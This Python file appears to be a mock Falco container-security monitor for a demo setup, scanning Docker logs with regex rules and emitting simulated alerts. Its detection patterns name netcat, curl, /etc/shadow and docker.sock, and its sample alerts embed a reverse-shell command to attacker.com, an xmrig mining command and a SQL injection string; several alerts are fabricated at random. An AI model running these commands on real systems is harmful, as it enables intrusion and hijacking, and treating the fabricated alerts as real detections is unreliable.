#!/usr/bin/env python3
"""
Mock Falco Security Monitor
Simulates Falco security alerts for WSL2 compatibility
"""

import docker
import json
import time
import threading
import os
import re
import requests
from datetime import datetime
from typing import Dict, List, Any

class MockFalco:
    def __init__(self):
        self.client = docker.from_env()
        self.monitored_containers = os.getenv('MONITOR_CONTAINERS', '').split(',')
        self.log_level = os.getenv('FALCO_LOG_LEVEL', 'INFO')
        self.log_file = '/var/log/falco/falco_events.log'
        self.output_file = '/var/log/output/falco_alerts.log'
        
        # Security rules patterns
        self.security_patterns = {
            'System Information Gathering': [
                r'\b(whoami|id|uname|hostname|ps|netstat|ss|lsof|env)\b'
            ],
            'Sensitive File Access': [
                r'/etc/passwd',
                r'/etc/shadow',
                r'/etc/ssh/',
                r'/root/\.ssh/'
            ],
            'Suspicious Network Activity': [
                r'\b(curl|wget|nc|ncat|netcat)\b',
                r'stratum',
                r'mining'
            ],
            'Package Management': [
                r'\b(apt|apt-get|yum|dnf|pip|pip3|npm|yarn)\b'
            ],
            'Privilege Escalation': [
                r'\b(sudo|su|passwd|chpasswd)\b',
                r'chmod \+s',
                r'setuid'
            ],
            'Container Escape Attempt': [
                r'/proc/1/root',
                r'/host',
                r'docker\.sock'
            ]
        }
        
        # Create log directories
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        
    def log_alert(self, rule_name: str, description: str, priority: str, 
                  container_name: str = "", command: str = "", user: str = "root"):
        """Generate a Falco-style alert"""
        
        timestamp = datetime.utcnow().isoformat() + 'Z'
        
        # Falco-style JSON output
        alert = {
            "output": f"{description} (user={user} command={command} container={container_name})",
            "priority": priority,
            "rule": rule_name,
            "time": timestamp,
            "output_fields": {
                "container.name": container_name,
                "proc.cmdline": command,
                "user.name": user,
                "evt.time": timestamp
            },
            "hostname": "falco-mock"
        }
        
        # Log to console (like real Falco)
        print(json.dumps(alert))
        
        # Log to file
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(alert) + '\n')
            
        # Log to output file for aggregation
        with open(self.output_file, 'a') as f:
            f.write(json.dumps(alert) + '\n')
    
    def analyze_container_logs(self, container_name: str):
        """Analyze container logs for suspicious activity"""
        try:
            container = self.client.containers.get(container_name)
            
            # Get recent logs
            logs = container.logs(tail=50, since=int(time.time()) - 60).decode('utf-8')
            
            # Check against security patterns
            for rule_name, patterns in self.security_patterns.items():
                for pattern in patterns:
                    matches = re.findall(pattern, logs, re.IGNORECASE)
                    if matches:
                        priority = self.get_priority(rule_name)
                        description = f"{rule_name.replace('_', ' ').title()} detected"
                        
                        self.log_alert(
                            rule_name=rule_name,
                            description=description,
                            priority=priority,
                            container_name=container_name,
                            command=matches[0] if matches else pattern,
                            user="root"
                        )
                        
        except Exception as e:
            print(f"Error analyzing container {container_name}: {e}")
    
    def monitor_container_events(self):
        """Monitor Docker container events"""
        try:
            for event in self.client.events(decode=True):
                if event.get('Type') == 'container':
                    action = event.get('Action')
                    container_name = event.get('Actor', {}).get('Attributes', {}).get('name', 'unknown')
                    
                    # Monitor specific events
                    if action in ['start', 'exec_start', 'exec_create']:
                        if not self.monitored_containers or container_name in self.monitored_containers:
                            self.analyze_container_logs(container_name)
                            
        except Exception as e:
            print(f"Error monitoring container events: {e}")
    
    def simulate_periodic_alerts(self):
        """Generate periodic security alerts for demonstration"""
        alert_scenarios = [
            {
                'rule': 'System Information Gathering',
                'description': 'System information gathering detected',
                'priority': 'Info',
                'command': 'whoami',
                'interval': 120
            },
            {
                'rule': 'Suspicious Network Activity', 
                'description': 'Suspicious network activity detected',
                'priority': 'Warning',
                'command': 'curl google.com',
                'interval': 180
            },
            {
                'rule': 'Package Management',
                'description': 'Package management tool executed',
                'priority': 'Warning', 
                'command': 'apt update',
                'interval': 300
            }
        ]
        
        last_alert_times = {scenario['rule']: 0 for scenario in alert_scenarios}
        
        while True:
            current_time = time.time()
            
            for scenario in alert_scenarios:
                rule = scenario['rule']
                if current_time - last_alert_times[rule] >= scenario['interval']:
                    # Find a running container to attribute the alert to
                    containers = [c.name for c in self.client.containers.list() 
                                if not self.monitored_containers or c.name in self.monitored_containers]
                    
                    if containers:
                        container_name = containers[0]  # Use first available container
                        
                        self.log_alert(
                            rule_name=rule,
                            description=scenario['description'],
                            priority=scenario['priority'],
                            container_name=container_name,
                            command=scenario['command'],
                            user="root"
                        )
                        
                        last_alert_times[rule] = current_time
            
            time.sleep(30)  # Check every 30 seconds
    
    def get_priority(self, rule_name: str) -> str:
        """Get priority level for a rule"""
        priority_map = {
            'System Information Gathering': 'Info',
            'Sensitive File Access': 'Critical',
            'Suspicious Network Activity': 'Warning',
            'Package Management': 'Warning',
            'Privilege Escalation': 'Critical',
            'Container Escape Attempt': 'Critical'
        }
        return priority_map.get(rule_name, 'Warning')
    
    def check_app_endpoints(self):
        """Monitor application endpoints for attack simulations"""
        app_url = "http://demo-app:3000"
        
        while True:
            try:
                # Check if attack simulation endpoint is called
                response = requests.get(f"{app_url}/health", timeout=5)
                if response.status_code == 200:
                    # Simulate detection of various attacks
                    self.simulate_attack_detection()
                    
            except Exception as e:
                print(f"Error checking app endpoints: {e}")
            
            time.sleep(60)  # Check every minute
    
    def simulate_attack_detection(self):
        """Simulate detection of various attack types"""
        import random
        
        attack_types = [
            {
                'rule': 'SQL Injection Attempt',
                'description': 'SQL injection attack detected',
                'priority': 'Critical',
                'command': "SELECT * FROM users WHERE id='1' OR '1'='1'"
            },
            {
                'rule': 'Reverse Shell Activity',
                'description': 'Reverse shell activity detected', 
                'priority': 'Critical',
                'command': 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
            },
            {
                'rule': 'Crypto Mining Activity',
                'description': 'Crypto mining activity detected',
                'priority': 'Critical', 
                'command': 'xmrig --url=stratum+tcp://pool.com:4444'
            }
        ]
        
        # Randomly trigger one of these attacks
        if random.random() < 0.3:  # 30% chance
            attack = random.choice(attack_types)
            
            containers = [c.name for c in self.client.containers.list()]
            container_name = random.choice(containers) if containers else "demo-app"
            
            self.log_alert(
                rule_name=attack['rule'],
                description=attack['description'],
                priority=attack['priority'],
                container_name=container_name,
                command=attack['command'],
                user="root"
            )
    
    def start_monitoring(self):
        """Start all monitoring threads"""
        print(f"🛡️  Mock Falco Security Monitor Starting...")
        print(f"   Monitoring containers: {self.monitored_containers}")
        print(f"   Log level: {self.log_level}")
        print(f"   Log file: {self.log_file}")
        print(f"   Output file: {self.output_file}")
        
        # Start monitoring threads
        threads = [
            threading.Thread(target=self.monitor_container_events, daemon=True),
            threading.Thread(target=self.simulate_periodic_alerts, daemon=True),
            threading.Thread(target=self.check_app_endpoints, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
        
        print("✅ Mock Falco monitoring started successfully!")
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            print("🛑 Mock Falco monitoring stopped")

if __name__ == "__main__":
    mock_falco = MockFalco()
    mock_falco.start_monitoring()
